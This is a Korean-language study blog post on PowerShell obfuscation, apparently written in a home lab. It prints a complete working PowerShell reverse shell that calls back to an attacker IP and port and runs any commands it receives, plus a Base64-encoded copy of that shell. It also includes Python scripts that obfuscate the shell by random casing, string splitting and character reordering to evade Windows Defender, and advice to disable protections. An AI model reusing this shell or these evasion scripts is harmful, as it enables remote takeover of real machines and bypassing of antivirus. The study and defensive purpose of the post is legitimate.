---
title: '[Study] PowerShell Obfuscation'
date: 2025-09-02 00:00:00
categories: [Study, Windows]
tags: []
published: True
---

# #Intro

공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 알아보았다.



<br>

<br>

# #Reverse Shell in PowerShell

![image](/assets/posts/250902-2.png){: width="300" }

우선, 공격자 머신에서 nc 명령어로 리스닝을 수행하였다.

<br>

[https://www.revshells.com](https://www.revshells.com)

그 다음, 위의 사이트를 통해 공격자 머신의 IP 주소와 Port 번호를 값으로 하는 PowerShell의 리버스 셸 코드를 얻을 수 있었다.

```powershell
$LHOST = '192.168.195.20';
$LPORT = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024;
while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
    };

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
        $StreamWriter.Write("$Output`n");
        $Code = $null
    }
};
$TCPClient.Close();
$NetworkStream.Close();
$StreamReader.Close();
$StreamWriter.Close()
```

<br>

![image](/assets/posts/250902-1.png)

해당 코드를 Windows PowerShell ISE로 편집하여 저장하고, 리스닝 중인 공격자 머신의 IP 주소와 Port를 인자로 하여 리버스 셸 접속을 시도하였다.

<br>

> 이때, Windows Defender와 같은 보안 솔루션이 실행 중이라면, PowerShell 스크립트 실행이 차단될 수 있다. 이 경우에는 해당 솔루션에서 예외 처리를 해주어야 한다. (실습 환경에서는 Windows Defender가 실행 중이다.) 또한, PowerShell의 실행 정책이 제한적이라면, 아래 명령어로 프로세스 범위에서 실행 정책을 변경해주어야 한다.
> ```powershell
> Set-ExecutionPolicy Unrestricted
> ```

<br>

![image](/assets/posts/250902-3.png)

![image](/assets/posts/250902-4.png)

정상적으로 리스닝 중인 공격자 머신에서 PowerShell이 연결되는 것을 확인할 수 있다.

<br>

<br>

# #Obfuscation

## Base64 Encoding

위에서 작성한 Reverse Shell 연결 .ps1 코드를, 난독화 기법으로 많이 사용되는 Base64 인코딩을 적용하여 변환하였다.

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Users\r4m\workspace\malware-workspace\revshell.ps1" -Encoding Byte -Raw))
```

<br>

명령을 실행하면 아래와 같은 인코딩 값을 얻을 수 있다.

```
77u/JExIT1NUID0gJzE5Mi4xNjguMTk1LjIwJzsNCiRMUE9SVCA9IDQ0NDQ7DQokVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOw0KJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOw0KJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsNCiRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7DQokU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOw0KJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0Ow0Kd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7DQogICAgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsNCiAgICAgICAgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsNCiAgICAgICAgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpDQogICAgfTsNCg0KICAgIGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgew0KICAgICAgICAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9Ow0KICAgICAgICAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsNCiAgICAgICAgJENvZGUgPSAkbnVsbA0KICAgIH0NCn07DQokVENQQ2xpZW50LkNsb3NlKCk7DQokTmV0d29ya1N0cmVhbS5DbG9zZSgpOw0KJFN0cmVhbVJlYWRlci5DbG9zZSgpOw0KJFN0cmVhbVdyaXRlci5DbG9zZSgpDQo=
```

<br>

인코딩된 값과 함께 PowerShell 실행 시 식에 대한 평가를 진행할 수 있도록 인자를 주어 `powershell -EncodedCommand <인코딩된 값>` 형태로 사용할 수 있다. 그러나, 이 코드를 .ps1 파일에 저장함과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>

<br>

## Random Case

대소문자에 변화를 주는 난독화 방법이다. 예를 들어, `ReVeRsEsHeLl`과 같이 대소문자를 섞어서 작성하는 방법이다.

<br>

```python
# random_case.py
revshell_code = ""
with open('revshell.txt', 'r') as file:
    revshell_code = file.read()

revshell_code = revshell_code.replace('\n', '')
revshell_code = revshell_code.replace('\r', '')
revshell_code = revshell_code.replace(' ', '')
revshell_code = revshell_code.lower()

new_revshell = ""
for index, char in enumerate(revshell_code):
    if index % 2 == 0:
        new_revshell += char.upper()
    else:
        new_revshell += char

print(new_revshell)

with open('revshell.ps1', 'w') as file:
    file.write(new_revshell)
```

위의 코드로 대소문자가 섞인 난독화된 PowerShell Reverse Shell 코드를 생성할 수 있다. 그러나 이 방법도 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

## Division

PowerShell에서 `'String' + 'String'` 형태로 문자열을 결합할 수 있고, 이를 이용하여 난독화된 코드를 생성할 수 있다. PowerShell에서 문자들이 결합하여 문자열을 이룰 수 있도록 싱글 쿼터와 더블 쿼터를 모두 하나로 맞춰주고, 문자열이 결합된 후에 이 식이 평가되어 실행될 수 있도록 `Invoke-Expression`을 이용한다.

<br>

```python
# division.py
revshell_code = ''
with open('revshell.txt', 'r') as file:
    revshell_code = file.read()

revshell_code = revshell_code.replace('\n', '')
revshell_code = revshell_code.replace('\r', '')
revshell_code = revshell_code.replace(' ', '')
revshell_code = revshell_code.replace("'", '"')

new_revshell = '$str='
for index, char in enumerate(revshell_code):

    if index % 3 == 0:
        new_revshell += f"'{char}"
    elif index % 3 == 1:
        new_revshell += f"{char}'"
    else:
        new_revshell += f"+'{char}'+"

if new_revshell.endswith("+"):
    new_revshell = new_revshell[:-1]

new_revshell += ';Invoke-Expression $str'

print(new_revshell)

with open('revshell.ps1', 'w') as file:
    file.write(new_revshell)
```

<br>

![image](/assets/posts/250902-5.png)

해당 코드를 실행하면, 이번에는 Windows Defender에 의해 차단되지 않고 정상적으로 .ps1 파일이 생성되는 것을 확인할 수 있다.

<br>

![image](/assets/posts/250902-6.png)

그러나, 생성된 .ps1 파일을 실행하면, 위와 같이 Windows Defender가 차단하는 것을 확인할 수 있다. 이는 이전 난독화 기법에서 파일 내의 코드 혹은 시그니처를 기반으로 악성코드를 탐지하는 것과 다르게, 파일 실행 시 동작하는 행위를 기반으로 악성코드를 탐지하는 것을 알 수 있다.

<br>
<br>

## Reorder

코드 문자열의 문자들을 섞음으로써 난독화된 코드를 생성할 수 있고, 이를 실행할 때에는 PowerShell에서 제공하는 `-f` 옵션을 통해 포맷팅된 문자열을 복원하여 사용할 수 있다. 포맷팅된 문자열은 `Invoke-Expression`을 통해 평가되어 실행될 수 있다.

<br>

```python
# reorder.py
import random

revshell_code = ''
with open('revshell.txt', 'r') as file:
    revshell_code = file.read()

revshell_code = revshell_code.replace('\n', '')
revshell_code = revshell_code.replace('\r', '')
revshell_code = revshell_code.replace(' ', '')
revshell_code = revshell_code.replace("'", '"')

indexed_chars = list(enumerate(revshell_code))
random.shuffle(indexed_chars)
new_chars = [(new_index, (old_index, char)) for new_index, (old_index, char) in enumerate(indexed_chars)]
new_chars_sorted = sorted(new_chars, key=lambda x: x[1][0])

shuffled_string = ''.join([f"'{char}'," for index, char in indexed_chars])
shuffled_string = shuffled_string[:-1]

shuffled_index = ''.join([f'{{{new_index}}}' for new_index, (old_index, char) in new_chars_sorted])
shuffled_index = "'" + shuffled_index + "'"

new_revshell = f'$str={shuffled_index}-f{shuffled_string};Invoke-Expression $str'

print(new_revshell)

with open('revshell.ps1', 'w') as file:
    file.write(new_revshell)
```

<br>

![image](/assets/posts/250902-7.png)

`Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, .ps1 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.


> **Reference**
>
> [https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/](https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/)
{: .prompt-info }
